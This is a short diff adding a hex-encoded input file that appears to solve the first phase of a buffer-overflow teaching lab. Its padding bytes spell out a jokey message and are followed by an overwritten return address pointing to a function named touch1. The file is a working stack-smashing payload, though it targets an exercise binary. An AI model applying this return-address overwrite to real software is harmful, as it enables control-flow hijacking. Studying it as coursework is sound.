@@ -1,0 +1,9 @@
+/* This is the normal string: "Hi, I'm a bad guy. I want to run touch1." */
+48 69 2c 20 49 27 6d 20 
+61 20 62 61 64 20 67 75 
+79 2e 20 49 20 77 61 6e 
+74 20 74 6f 20 72 75 6e 
+20 74 6f 75 63 68 31 2e
+
+/* Here is the address of touch1: 0x4017c0 */
+c0 17 40 00 00 00 00 00
